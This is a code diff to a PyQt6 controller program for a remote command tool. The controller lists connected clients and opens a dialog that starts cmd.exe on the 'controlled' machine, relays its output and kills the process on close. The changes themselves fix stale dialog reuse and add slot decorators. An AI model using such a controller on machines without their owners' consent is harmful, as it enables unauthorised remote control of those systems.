@@ -5,13 +5,12 @@ from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                              QMenu, QAbstractItemView)
-from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject
+from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot
 import struct
 
 
 class ClientSignals(QObject):
-    """子线程用来发信号，必须独立QObject子类，不能放到ClientSession"""
-    on_outp = pyqtSignal(object, str)  # sess对象，输出文本
+    on_outp = pyqtSignal(object, str)
     on_disconnect = pyqtSignal(object)
 
 
@@ -49,6 +48,7 @@ class ClientSession:
 class RemoteCmdDialog(QDialog):
     def __init__(self, client_session: ClientSession, parent=None):
         super().__init__(parent)
+        self.main_window = parent
         self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
         self.resize(680, 450)
         self.client = client_session
@@ -69,8 +69,8 @@ class RemoteCmdDialog(QDialog):
         self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
         self.client.send_packet(b"SPAW")
 
+    @pyqtSlot(str)
     def append_text(self, text: str):
-        """只能主线程调用"""
         self.out_box.append(text)
 
     def on_enter_command(self):
@@ -87,9 +87,12 @@ class RemoteCmdDialog(QDialog):
 
     def closeEvent(self, event):
         self.is_alive = False
+        # 关闭时发送KILL
         if self.client.connected:
             self.client.send_packet(b"KILL")
-        self.out_box.append("\n[*] 已发送KILL；被控端cmd进程已终止")
+        # 主动从主窗口字典中移除自己，避免第二次打开复用旧窗口
+        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
+            del self.main_window.open_cmd_dialogs[self.client]
         super().closeEvent(event)
 
 
@@ -174,12 +177,13 @@ class MainWindow(QMainWindow):
             except OSError:
                 break
 
+    @pyqtSlot(object, str)
     def handle_session_outp(self, sess: ClientSession, text: str):
-        """主线程执行：输出回显"""
         if sess in self.open_cmd_dialogs:
             dlg = self.open_cmd_dialogs[sess]
             dlg.append_text(text)
 
+    @pyqtSlot(object)
     def handle_session_disconnect(self, sess: ClientSession):
         if sess in self.open_cmd_dialogs:
             dlg = self.open_cmd_dialogs.pop(sess)
@@ -213,7 +217,6 @@ class MainWindow(QMainWindow):
                         elif cmd_code == b"OUTP":
                             output_bytes = body[4:]
                             out_text = output_bytes.decode("gbk", errors="replace")
-                            # 子线程只发射信号，不碰UI
                             sess.signals.on_outp.emit(sess, out_text)
 
             except OSError:
@@ -256,10 +259,17 @@ class MainWindow(QMainWindow):
         act_open_cmd = menu.addAction("打开远程CMD会话")
         ret = menu.exec(self.view.viewport().mapToGlobal(pos))
         if ret == act_open_cmd:
+            # 修复：检查旧对话框是否还存活
             if sess in self.open_cmd_dialogs:
-                self.open_cmd_dialogs[sess].raise_()
-                self.open_cmd_dialogs[sess].activateWindow()
-                return
+                dlg = self.open_cmd_dialogs[sess]
+                if dlg.isVisible():
+                    dlg.raise_()
+                    dlg.activateWindow()
+                    return
+                else:
+                    # 旧对话框已关闭，清理字典
+                    del self.open_cmd_dialogs[sess]
+            # 创建全新对话框
             dlg = RemoteCmdDialog(sess, parent=self)
             self.open_cmd_dialogs[sess] = dlg
             dlg.show()
@@ -274,3 +284,4 @@ if __name__ == "__main__":
     win = MainWindow()
     win.show()
     sys.exit(app.exec())
+
